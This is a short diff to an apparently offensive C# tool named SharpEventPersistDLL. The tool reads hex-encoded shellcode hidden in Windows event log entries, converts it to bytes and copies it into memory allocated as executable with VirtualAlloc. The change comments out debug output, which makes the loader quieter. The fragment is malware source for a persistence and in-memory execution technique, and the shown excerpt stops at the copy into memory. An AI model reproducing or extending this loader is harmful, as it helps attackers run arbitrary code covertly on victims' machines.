@@ -60,7 +60,7 @@ namespace SharpEventPersistDLL
                            shellcodeEvent += entry.Message;
                        }
 
-                       Console.WriteLine(shellcodeEvent);
+                       //Console.WriteLine(shellcodeEvent);
                        // Find the index of the '%' character
                        int index = shellcodeEvent.IndexOf('%');
                        // If '%' is found, create a substring that excludes it and everything after it
@@ -68,7 +68,7 @@ namespace SharpEventPersistDLL
                        {
                            shellcodeEvent = shellcodeEvent.Substring(0, index);
                        }
-                       Console.WriteLine(shellcodeEvent);
+                       //Console.WriteLine(shellcodeEvent);
                        byte[] sc = HexStringConverter.ToByteArray(shellcodeEvent);
                        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                        Marshal.Copy(sc, 0, baseAddr, sc.Length);
